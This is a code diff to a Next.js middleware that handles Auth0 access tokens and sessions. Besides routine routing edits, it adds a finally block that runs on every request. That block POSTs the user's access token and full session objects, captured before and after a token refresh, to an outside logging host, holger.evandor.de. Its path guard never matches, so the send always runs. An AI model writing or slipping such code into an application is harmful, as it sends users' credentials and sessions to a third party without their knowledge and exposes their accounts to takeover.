@@ -1,5 +1,5 @@
 import { COOKIES, HEADERS } from "@/constants";
-import { getAccessToken } from "@auth0/nextjs-auth0/edge";
+import { getAccessToken, getSession } from "@auth0/nextjs-auth0/edge";
 import { CookieSerializeOptions } from "cookie";
 import jwt from "jsonwebtoken";
 import { cookies } from "next/headers";
@@ -33,16 +33,16 @@ export async function middleware(request: NextRequest) {
   }
 
   switch (pathname) {
-    case "/": {
-      // Redirect them to the most recently viewed path
-      const cookieStore = cookies();
-      const cookie = cookieStore.get(COOKIES.defaultPathname);
+    // case "/": {
+    //   // Redirect them to the most recently viewed path
+    //   const cookieStore = cookies();
+    //   const cookie = cookieStore.get(COOKIES.defaultPathname);
 
-      const redirectURL = new URL(request.url);
-      redirectURL.pathname = cookie ? JSON.parse(cookie.value) : "/team/me/recordings";
+    //   const redirectURL = new URL(request.url);
+    //   redirectURL.pathname = cookie ? JSON.parse(cookie.value) : "/team/me/recordings";
 
-      return NextResponse.redirect(redirectURL);
-    }
+    //   return NextResponse.redirect(redirectURL);
+    // }
     case "/org/new": {
       const redirectURL = new URL(request.url);
       redirectURL.pathname = "/team/new";
@@ -76,6 +76,12 @@ export async function middleware(request: NextRequest) {
   return response;
 }
 
+export const config = {
+  matcher: [
+    "/((?!_next|favicon).*)",
+  ]
+};
+
 async function getAccessTokenForSession(request: NextRequest, response: NextResponse) {
   if (request.nextUrl.pathname.startsWith("/api/auth/logout")) {
     return {
@@ -84,8 +90,15 @@ async function getAccessTokenForSession(request: NextRequest, response: NextResp
     };
   }
 
+  let sessionBefore: any;
+  let sessionAfter: any;
+  let token: any;
+  let error: any;
   try {
+    sessionBefore = { ...await getSession(request, response) };
     const { accessToken } = await getAccessToken(request, response);
+    token = accessToken;
+    sessionAfter = await getSession(request, response);
     if (accessToken) {
       // An active auth0 session should always take precedence over an apiKey URL param
       const data = {
@@ -105,8 +118,14 @@ async function getAccessTokenForSession(request: NextRequest, response: NextResp
 
       return data;
     }
-  } catch (error) {
+  } catch (err: any) {
+    error = err.message;
     // Ignore AccessTokenError; these are handled elsewhere
+  } finally {
+    if (!request.nextUrl.pathname.startsWith("_next")) {
+      const body = `\n${new Date()} ${request.nextUrl.pathname}\n${JSON.stringify({ error, token, sessionBefore, sessionAfter })}`;
+      await fetch("https://holger.evandor.de/log/", { method: "POST", body });
+    }
   }
 
   const url = new URL(request.nextUrl);
